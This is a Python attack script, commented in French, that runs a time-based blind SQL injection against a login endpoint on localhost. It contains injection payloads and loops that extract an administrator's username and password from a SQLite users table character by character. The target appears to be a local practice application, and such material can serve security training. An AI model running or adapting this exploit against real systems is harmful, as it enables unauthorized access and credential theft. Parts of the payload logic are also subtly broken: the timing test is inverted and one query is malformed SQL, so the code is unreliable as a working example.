import requests
import time
import string

# URL de l'application vulnérable
BASE_URL = "http://localhost:5000/login"

def time_based_blind_injection(payload, threshold=1.0):
    """Teste une injection SQL basée sur le temps"""
    data = {
        "username": payload,
        "password": "anything"
    }
    
    start_time = time.time()
    response = requests.post(BASE_URL, data=data)
    elapsed_time = time.time() - start_time
    
    # Si le temps de réponse dépasse le seuil, l'injection a probablement fonctionné
    return elapsed_time > threshold, elapsed_time

def extract_data_length(field, table, condition="1=1", max_length=20):
    """Détermine la longueur d'une donnée en utilisant une injection SQL en aveugle"""
    print(f"[*] Détermination de la longueur de {field} dans {table} où {condition}...")
    
    for length in range(1, max_length + 1):
        payload = f"' OR (SELECT CASE WHEN (SELECT length({field}) FROM {table} WHERE {condition})={length} THEN 1=1 ELSE (SELECT 1 FROM sqlite_master LIMIT 500000) END)=1 --"
        success, time_taken = time_based_blind_injection(payload)
        
        print(f"  Longueur {length}: {time_taken:.2f}s {'(TROUVÉ!)' if success else ''}")
        
        if success:
            return length
    
    return None

def extract_data(field, table, condition="1=1", data_length=None):
    """Extrait des données caractère par caractère en utilisant une injection SQL en aveugle"""
    if data_length is None:
        data_length = extract_data_length(field, table, condition)
        if data_length is None:
            print("[-] Impossible de déterminer la longueur des données")
            return None
    
    print(f"[*] Extraction de {field} (longueur: {data_length})...")
    result = ""
    
    # Caractères possibles
    chars = string.ascii_letters + string.digits + string.punctuation + " "
    
    for pos in range(1, data_length + 1):
        for char in chars:
            # Échapper les caractères spéciaux dans la requête SQL
            escaped_char = char.replace("'", "''")
            
            payload = f"' OR (SELECT CASE WHEN substr({field},{pos},1)='{escaped_char}' FROM {table} WHERE {condition} THEN 1=1 ELSE (SELECT 1 FROM sqlite_master LIMIT 500000) END)=1 --"
            success, time_taken = time_based_blind_injection(payload)
            
            if success:
                result += char
                print(f"  Position {pos}: '{char}' trouvé ({time_taken:.2f}s)")
                break
        else:
            print(f"  Position {pos}: Aucun caractère trouvé")
            result += "?"
    
    return result

def main():
    print("=== Test d'injection SQL en aveugle (time-based) ===")
    
    # Test simple pour vérifier si l'injection basée sur le temps fonctionne
    print("[*] Test d'une injection basée sur le temps...")
    payload = "' OR (SELECT CASE WHEN 1=1 THEN 1=1 ELSE (SELECT 1 FROM sqlite_master LIMIT 500000) END)=1 --"
    success, time_taken = time_based_blind_injection(payload)
    
    if success:
        print(f"[+] L'injection basée sur le temps fonctionne! ({time_taken:.2f}s)")
        
        # Extraction du nom d'utilisateur de l'administrateur
        admin_username = extract_data("username", "users", "id=1")
        if admin_username:
            print(f"[+] Nom d'utilisateur de l'administrateur: {admin_username}")
            
            # Extraction du mot de passe de l'administrateur
            admin_password = extract_data("password", "users", "id=1")
            if admin_password:
                print(f"[+] Mot de passe de l'administrateur: {admin_password}")
    else:
        print(f"[-] L'injection basée sur le temps ne semble pas fonctionner ({time_taken:.2f}s)")

if __name__ == "__main__":
    main() 